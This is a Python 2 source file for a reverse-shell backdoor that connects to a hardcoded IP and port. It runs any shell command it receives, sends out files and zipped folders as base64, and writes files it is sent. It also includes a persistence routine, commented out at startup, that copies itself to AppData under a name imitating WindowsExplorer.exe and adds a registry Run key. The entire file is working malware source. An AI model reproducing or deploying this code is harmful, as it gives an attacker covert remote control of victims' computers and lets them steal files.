#!/usr/bin/env python2.7
import socket,json,os,base64,sys,shutil
import  subprocess

class Backdoor:
    def __init__(self,ip,port):
        #self.become_persistant()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n[+] Connection Established\n")

    def become_persistant(self):
        evil_file_location = os.environ["appdata"] + "\\WindowsExplorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)
    def execute_system_commands(self, command):
        DEVNULL = open(os.devnull,"wb")
        return subprocess.check_output(command, shell=True,stderr=DEVNULL,stdin=DEVNULL)

    def send_reliable(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive_reliable(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except:
                continue

    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] changing working directory to "+ path
    def read_file(self,path):
        with open(path,"rb") as file:
            file_encode_base64 = base64.b64encode(file.read())
            return file_encode_base64

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "Upload successful"
    def run(self):
        while True:
            command = self.receive_reliable()
           # print(command)
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command)>1:
                    self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    if os.path.isdir(command[1]):
                        archive = shutil.make_archive(command[1],"zip", command[1])
                        # print(archive)
                        command_result = self.read_file(archive)
                    else:
                        command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])

                else:
                    command_result = self.execute_system_commands(command)
            except Exception:
               # print("[-] Error during command execution.")
                command_result = "[-] Error during command execution."
            self.send_reliable(command_result)
try:
    backdoor = Backdoor("192.168.184.156",4400)
    backdoor.run()
except Exception:
    sys.exit()
